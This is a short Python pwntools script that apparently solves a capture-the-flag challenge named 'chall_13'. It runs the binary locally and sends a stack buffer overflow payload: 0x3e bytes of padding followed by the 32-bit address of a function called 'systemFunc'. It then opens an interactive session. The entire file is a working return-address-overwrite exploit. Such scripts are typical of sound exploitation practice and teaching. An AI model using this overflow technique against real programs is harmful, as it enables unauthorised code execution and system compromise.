from pwn import *
binary = ELF("./chall_13")
p=process("./chall_13")
p.recv()
p.sendline()
p.sendline((0x3a+0x4)*b"A"+p32(binary.sym.systemFunc))
p.interactive()
